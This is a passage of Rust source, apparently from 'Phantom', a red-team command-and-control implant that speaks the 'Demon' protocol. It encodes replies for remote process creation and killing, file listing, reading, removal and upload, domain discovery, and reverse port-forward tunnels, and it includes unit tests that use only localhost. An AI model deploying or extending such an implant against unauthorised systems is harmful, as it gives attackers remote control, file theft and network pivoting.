        let path = parts.nth(4).unwrap_or_default();
        if path.is_empty() || !path.starts_with('/') {
            continue;
        }
        let Some((base, _)) = range.split_once('-') else {
            continue;
        };
        let Ok(base_addr) = u64::from_str_radix(base, 16) else {
            continue;
        };
        modules.entry(path.to_string()).or_insert(base_addr);
    }
    Ok(modules.into_iter().collect())
}

fn linux_domain_name() -> String {
    fs::read_to_string("/etc/resolv.conf")
        .ok()
        .and_then(|contents| {
            contents.lines().find_map(|line| {
                let trimmed = line.trim();
                trimmed
                    .strip_prefix("search ")
                    .or_else(|| trimmed.strip_prefix("domain "))
                    .map(|value| value.trim().to_string())
            })
        })
        .unwrap_or_default()
}

fn normalize_path(value: &str) -> PathBuf {
    if value.is_empty() || value == "." {
        std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
    } else {
        PathBuf::from(value)
    }
}

fn io_error(path: impl AsRef<Path>, error: std::io::Error) -> PhantomError {
    PhantomError::Io { path: path.as_ref().to_path_buf(), message: error.to_string() }
}

fn split_args(arguments: &str) -> Vec<OsString> {
    arguments.split_whitespace().filter(|value| !value.is_empty()).map(OsString::from).collect()
}

fn encode_process_list(
    process_ui: u32,
    processes: &[ProcessEntry],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(process_ui);
    for process in processes {
        payload.extend_from_slice(&encode_utf16(&process.name)?);
        payload.extend_from_slice(&encode_u32(process.pid));
        payload.extend_from_slice(&encode_bool(process.is_wow64));
        payload.extend_from_slice(&encode_u32(process.parent_pid));
        payload.extend_from_slice(&encode_u32(process.session));
        payload.extend_from_slice(&encode_u32(process.threads));
        payload.extend_from_slice(&encode_utf16(&process.user)?);
    }
    Ok(payload)
}

fn encode_proc_create(
    path: &str,
    pid: u32,
    success: bool,
    piped: bool,
    verbose: bool,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Create));
    payload.extend_from_slice(&encode_utf16(path)?);
    payload.extend_from_slice(&encode_u32(pid));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_bool(piped));
    payload.extend_from_slice(&encode_bool(verbose));
    Ok(payload)
}

fn encode_proc_kill(success: bool, pid: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Kill));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(pid));
    payload
}

fn encode_proc_grep(processes: &[ProcessEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Grep));
    for process in processes {
        payload.extend_from_slice(&encode_utf16(&process.name)?);
        payload.extend_from_slice(&encode_u32(process.pid));
        payload.extend_from_slice(&encode_u32(process.parent_pid));
        payload.extend_from_slice(&encode_utf16(&process.user)?);
        payload.extend_from_slice(&encode_u32(if process.is_wow64 { 86 } else { 64 }));
    }
    Ok(payload)
}

fn encode_proc_modules(pid: u32, modules: &[(String, u64)]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Modules));
    payload.extend_from_slice(&encode_u32(pid));
    for (name, base) in modules {
        payload.extend_from_slice(&encode_bytes(name.as_bytes())?);
        payload.extend_from_slice(&encode_u64(*base));
    }
    Ok(payload)
}

fn encode_net_domain(domain: &str) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Domain));
    payload.extend_from_slice(&encode_bytes(domain.as_bytes())?);
    Ok(payload)
}

fn encode_fs_dir_listing(
    target: &Path,
    subdirs: bool,
    files_only: bool,
    dirs_only: bool,
    list_only: bool,
) -> Result<Vec<u8>, PhantomError> {
    let start_path = directory_root_path(target);
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Dir));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_bool(list_only));
    payload.extend_from_slice(&encode_utf16(&start_path)?);

    let listings = collect_directory_listings(target, subdirs, files_only, dirs_only)?;
    payload.extend_from_slice(&encode_bool(true));
    for listing in listings {
        let files = listing.entries.iter().filter(|entry| !entry.is_dir).count() as u32;
        let dirs = listing.entries.iter().filter(|entry| entry.is_dir).count() as u32;
        let total_size = listing
            .entries
            .iter()
            .filter(|entry| !entry.is_dir)
            .map(|entry| entry.size)
            .sum::<u64>();

        payload.extend_from_slice(&encode_utf16(&listing.root_path)?);
        payload.extend_from_slice(&encode_u32(files));
        payload.extend_from_slice(&encode_u32(dirs));
        if !list_only {
            payload.extend_from_slice(&encode_u64(total_size));
        }

        for entry in listing.entries {
            payload.extend_from_slice(&encode_utf16(&entry.name)?);
            if !list_only {
                payload.extend_from_slice(&encode_bool(entry.is_dir));
                payload.extend_from_slice(&encode_u64(entry.size));
                payload.extend_from_slice(&encode_u32(entry.modified.day));
                payload.extend_from_slice(&encode_u32(entry.modified.month));
                payload.extend_from_slice(&encode_u32(entry.modified.year));
                payload.extend_from_slice(&encode_u32(entry.modified.minute));
                payload.extend_from_slice(&encode_u32(entry.modified.hour));
            }
        }
    }

    Ok(payload)
}

fn collect_directory_listings(
    target: &Path,
    subdirs: bool,
    files_only: bool,
    dirs_only: bool,
) -> Result<Vec<FilesystemListing>, PhantomError> {
    let mut listings = Vec::new();
    let mut pending = vec![target.to_path_buf()];
    while let Some(root) = pending.pop() {
        let mut entries = Vec::new();
        let read_dir = fs::read_dir(&root).map_err(|error| io_error(&root, error))?;
        for entry in read_dir {
            let entry = entry.map_err(|error| io_error(&root, error))?;
            let path = entry.path();
            let metadata = entry.metadata().map_err(|error| io_error(&path, error))?;
            if metadata.is_dir() && subdirs {
                pending.push(path.clone());
            }
            if files_only && metadata.is_dir() {
                continue;
            }
            if dirs_only && metadata.is_file() {
                continue;
            }
            entries.push(FilesystemEntry {
                name: entry.file_name().to_string_lossy().into_owned(),
                is_dir: metadata.is_dir(),
                size: metadata.len(),
                modified: modified_time(metadata.modified().ok()),
            });
        }
        entries.sort_by(|left, right| left.name.cmp(&right.name));
        listings.push(FilesystemListing { root_path: directory_root_path(&root), entries });
    }
    listings.sort_by(|left, right| left.root_path.cmp(&right.root_path));
    Ok(listings)
}

fn modified_time(timestamp: Option<SystemTime>) -> ModifiedTime {
    let unix_timestamp = timestamp
        .and_then(|time| time.duration_since(UNIX_EPOCH).ok())
        .map(|duration| duration.as_secs() as i64)
        .unwrap_or_default();
    let datetime =
        OffsetDateTime::from_unix_timestamp(unix_timestamp).unwrap_or(OffsetDateTime::UNIX_EPOCH);
    ModifiedTime {
        day: datetime.day().into(),
        month: u8::from(datetime.month()).into(),
        year: u32::try_from(datetime.year()).unwrap_or_default(),
        minute: datetime.minute().into(),
        hour: datetime.hour().into(),
    }
}

fn directory_root_path(path: &Path) -> String {
    let display = path.display().to_string();
    if display.ends_with('/') { display } else { format!("{display}/") }
}

fn encode_fs_cat(path: &Path, contents: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Cat));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    payload.extend_from_slice(&encode_bool(true));
    payload.extend_from_slice(&encode_bytes(contents)?);
    Ok(payload)
}

fn encode_fs_path_only(
    subcommand: DemonFilesystemCommand,
    path: &Path,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    Ok(payload)
}

fn encode_fs_remove(path: &Path, is_dir: bool) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Remove));
    payload.extend_from_slice(&encode_bool(is_dir));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    Ok(payload)
}

fn encode_fs_copy_move(
    subcommand: DemonFilesystemCommand,
    success: bool,
    from: &Path,
    to: &Path,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_utf16(&from.display().to_string())?);
    payload.extend_from_slice(&encode_utf16(&to.display().to_string())?);
    Ok(payload)
}

fn encode_u32(value: u32) -> Vec<u8> {
    value.to_be_bytes().to_vec()
}

fn encode_u64(value: u64) -> Vec<u8> {
    value.to_be_bytes().to_vec()
}

fn encode_bool(value: bool) -> Vec<u8> {
    encode_u32(u32::from(value))
}

fn encode_bytes(value: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let len = u32::try_from(value.len())
        .map_err(|_| PhantomError::InvalidResponse("socket payload too large"))?;
    let mut out = Vec::with_capacity(4 + value.len());
    out.extend_from_slice(&len.to_be_bytes());
    out.extend_from_slice(value);
    Ok(out)
}

fn encode_utf16(value: &str) -> Result<Vec<u8>, PhantomError> {
    let encoded = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
    encode_bytes(&encoded)
}

fn encode_rportfwd_add(
    success: bool,
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardAdd));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_open(
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Open));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_read_success(
    socket_id: u32,
    socket_type: DemonSocketType,
    data: &[u8],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(true));
    payload.extend_from_slice(&encode_bytes(data)?);
    Ok(payload)
}

fn encode_socket_read_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socket_write_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Write));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socket_close(socket_id: u32, socket_type: DemonSocketType) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Close));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload
}

fn encode_socket_connect(success: bool, socket_id: u32, error_code: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Connect));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_rportfwd_remove(
    socket_id: u32,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardRemove));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_clear(success: bool) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardClear));
    payload.extend_from_slice(&encode_bool(success));
    payload
}

impl PendingCallback {
    pub(crate) fn command_id(&self) -> u32 {
        match self {
            Self::Output { .. } => u32::from(DemonCommand::CommandOutput),
            Self::Error { .. } => u32::from(DemonCommand::CommandError),
            Self::Exit { .. } => u32::from(DemonCommand::CommandExit),
            Self::Structured { command_id, .. } => *command_id,
            Self::MemFileAck { .. } => u32::from(DemonCommand::CommandMemFile),
            Self::FsUpload { .. } => u32::from(DemonCommand::CommandFs),
            Self::Socket { .. } => u32::from(DemonCommand::CommandSocket),
        }
    }

    pub(crate) fn request_id(&self) -> u32 {
        match self {
            Self::Output { request_id, .. }
            | Self::Error { request_id, .. }
            | Self::Exit { request_id, .. }
            | Self::Structured { request_id, .. }
            | Self::MemFileAck { request_id, .. }
            | Self::FsUpload { request_id, .. }
            | Self::Socket { request_id, .. } => *request_id,
        }
    }

    pub(crate) fn payload(&self) -> Result<Vec<u8>, PhantomError> {
        match self {
            Self::Output { text, .. } => encode_bytes(text.as_bytes()),
            Self::Error { text, .. } => {
                let mut payload = Vec::new();
                payload.extend_from_slice(&encode_u32(0x0d));
                payload.extend_from_slice(&encode_bytes(text.as_bytes())?);
                Ok(payload)
            }
            Self::Exit { exit_method, .. } => Ok(encode_u32(*exit_method)),
            Self::Structured { payload, .. } => Ok(payload.clone()),
            Self::MemFileAck { mem_file_id, success, .. } => {
                let mut payload = Vec::new();
                payload.extend_from_slice(&encode_u32(*mem_file_id));
                payload.extend_from_slice(&encode_bool(*success));
                Ok(payload)
            }
            Self::FsUpload { file_size, path, .. } => {
                let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Upload));
                payload.extend_from_slice(&encode_u32(*file_size));
                payload.extend_from_slice(&encode_utf16(path)?);
                Ok(payload)
            }
            Self::Socket { payload, .. } => Ok(payload.clone()),
        }
    }
}

#[cfg(test)]
mod tests {
    use std::net::Ipv4Addr;

    use red_cell_common::demon::{
        DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
        DemonSocketCommand,
    };

    use super::{PendingCallback, PhantomState, execute};

    fn utf16_payload(value: &str) -> Vec<u8> {
        let utf16 = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
        let mut payload = Vec::with_capacity(4 + utf16.len());
        payload.extend_from_slice(&(utf16.len() as i32).to_le_bytes());
        payload.extend_from_slice(&utf16);
        payload
    }

    fn read_u32(payload: &[u8], offset: &mut usize) -> u32 {
        let end = *offset + 4;
        let value = u32::from_be_bytes(payload[*offset..end].try_into().expect("u32"));
        *offset = end;
        value
    }

    fn read_bytes<'a>(payload: &'a [u8], offset: &mut usize) -> &'a [u8] {
        let len = read_u32(payload, offset) as usize;
        let end = *offset + len;
        let bytes = &payload[*offset..end];
        *offset = end;
        bytes
    }

    fn read_utf16(payload: &[u8], offset: &mut usize) -> String {
        let bytes = read_bytes(payload, offset);
        let utf16 = bytes
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        String::from_utf16(&utf16).expect("utf16")
    }

    #[tokio::test]
    async fn command_no_job_returns_no_callbacks() {
        let package = DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
        let mut state = PhantomState::default();
        execute(&package, &mut state).await.expect("execute");
        assert!(state.drain_callbacks().is_empty());
    }

    #[tokio::test]
    async fn get_pwd_queues_structured_fs_callback() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::GetPwd as i32).to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandFs));
        assert_eq!(*request_id, 1);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonFilesystemCommand::GetPwd));
        let path = read_utf16(payload, &mut offset);
        assert!(!path.is_empty());
    }

    #[tokio::test]
    async fn proc_create_with_pipe_returns_structured_and_output_callbacks() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonProcessCommand::Create as i32).to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        payload.extend_from_slice(&utf16_payload("/bin/sh"));
        payload.extend_from_slice(&utf16_payload("printf phantom-test"));
        payload.extend_from_slice(&1_i32.to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandProc, 2, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [
            PendingCallback::Structured { command_id, request_id, payload },
            PendingCallback::Output { request_id: output_request_id, text },
        ] = callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(*request_id, 2);
        assert_eq!(*output_request_id, 2);
        assert_eq!(text, "phantom-test");

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonProcessCommand::Create));
        assert_eq!(read_utf16(payload, &mut offset), "/bin/sh");
        assert!(read_u32(payload, &mut offset) > 0);
        assert_eq!(read_u32(payload, &mut offset), 1);
        assert_eq!(read_u32(payload, &mut offset), 1);
        assert_eq!(read_u32(payload, &mut offset), 0);
    }

    #[tokio::test]
    async fn proc_list_returns_structured_process_payload() {
        let package =
            DemonPackage::new(DemonCommand::CommandProcList, 7, 0_i32.to_le_bytes().to_vec());
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandProcList));
        assert_eq!(*request_id, 7);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), 0);
        assert!(offset < payload.len());
    }

    #[tokio::test]
    async fn net_domain_returns_structured_payload() {
        let package = DemonPackage::new(
            DemonCommand::CommandNet,
            8,
            (DemonNetCommand::Domain as i32).to_le_bytes().to_vec(),
        );
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(*request_id, 8);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Domain));
        let _domain = std::str::from_utf8(read_bytes(payload, &mut offset)).expect("utf8");
    }

    #[tokio::test]
    async fn memfile_then_upload_emits_expected_callbacks() {
        let content = b"phantom-upload";

        let mut memfile = Vec::new();
        memfile.extend_from_slice(&77_i32.to_le_bytes());
        memfile.extend_from_slice(&(content.len() as i64).to_le_bytes());
        memfile.extend_from_slice(&(content.len() as i32).to_le_bytes());
        memfile.extend_from_slice(content);

        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("upload.bin");

        let mut upload = Vec::new();
        upload.extend_from_slice(&(DemonFilesystemCommand::Upload as i32).to_le_bytes());
        upload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        upload.extend_from_slice(&77_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandMemFile, 3, memfile), &mut state)
            .await
            .expect("memfile");
        execute(&DemonPackage::new(DemonCommand::CommandFs, 4, upload), &mut state)
            .await
            .expect("upload");

        let callbacks = state.drain_callbacks();
        assert!(matches!(
            callbacks.as_slice(),
            [
                PendingCallback::MemFileAck { request_id: 3, mem_file_id: 77, success: true },
                PendingCallback::FsUpload { request_id: 4, file_size, .. }
            ] if *file_size == content.len() as u32
        ));
        assert_eq!(std::fs::read(path).expect("read back"), content);
    }

    #[tokio::test]
    async fn reverse_port_forward_add_queues_socket_callback() {
        let listener = std::net::TcpListener::bind(("127.0.0.1", 0)).expect("reserve port");
        let port = listener.local_addr().expect("addr").port();
        drop(listener);

        let mut payload = Vec::new();
        payload
            .extend_from_slice(&(DemonSocketCommand::ReversePortForwardAdd as i32).to_le_bytes());
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&(i32::from(port)).to_le_bytes());
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&8080_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandSocket, 5, payload), &mut state)
            .await
            .expect("socket");

        assert!(matches!(
            state.drain_callbacks().as_slice(),
            [PendingCallback::Socket { request_id: 5, .. }]
        ));
    }
}
